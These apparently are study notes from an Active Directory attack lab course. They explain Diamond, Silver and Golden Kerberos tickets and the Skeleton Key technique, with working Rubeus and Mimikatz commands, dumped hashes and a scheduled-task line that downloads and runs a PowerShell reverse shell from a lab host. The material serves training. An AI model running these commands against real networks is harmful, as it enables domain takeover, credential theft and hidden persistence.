### Diamond Ticket
- A diamond ticket is _created by deciphering a valid TGT_, making changes to it and re-encrypt it using the AES keys of the krbtgt account.
- Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack.
- A diamond ticket is more opsec safe as it has:
	- Valid ticket times because a TGT issued by the DC is modified
	- In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.

#### Attack
```powershell
Rubeus.exe diamond
/krbkey:$hash /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
• We could also use _/tgtdeleg_ option in place of credentials in case we have access as a domain user:
```powershell
Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```



---
### Silver Ticket
- Encrypted and Signed by the hash of the service account of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).

#### Attack
- Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
```powershell
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
• Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more

![[Pasted image 20231215170859.png]]

#### Schedule and execute a task - noisy
```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
```
```powershell
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```

Command execution on the domain controller by creating silver tickets for:
– HOST service
– WMI


---
### Golden Ticket
- A golden ticket is signed and encrypted by the hash of krbtgt account for TGT ticket.
- The krbtgt user hash could be used to _impersonate any user with any privileges_ from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

#### Attack
- Run mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

• To use the DC-Sync feature for getting AES keys for krbtgt account. Run with DA privileges (or a user that has replication rights on the domain object):
```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

__Create Golden Ticket__
```powershell
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

![[Pasted image 20231215170136.png]]
![[Pasted image 20231215170247.png]]

---
### Skeleton Key
- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
- All the publicly known methods are NOT persistent across reboots.
- Yet again, mimikatz to the rescue.

#### Attack
- Use the below command to inject a skeleton key (password would be
mimikatz) on a Domain Controller of choice. DA privileges required
```powershell
Invoke-Mimikatz -Command '"privilege::debug"
"misc::skeleton"' -ComputerName dcorp-
dc.dollarcorp.moneycorp.local
```
• Now, it is possible to access any machine with a valid username and password as "mimikatz"
```powershell
`
Enter-PSSession -Computername dcorp-dc -credential
dcorp\Administrator
Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.










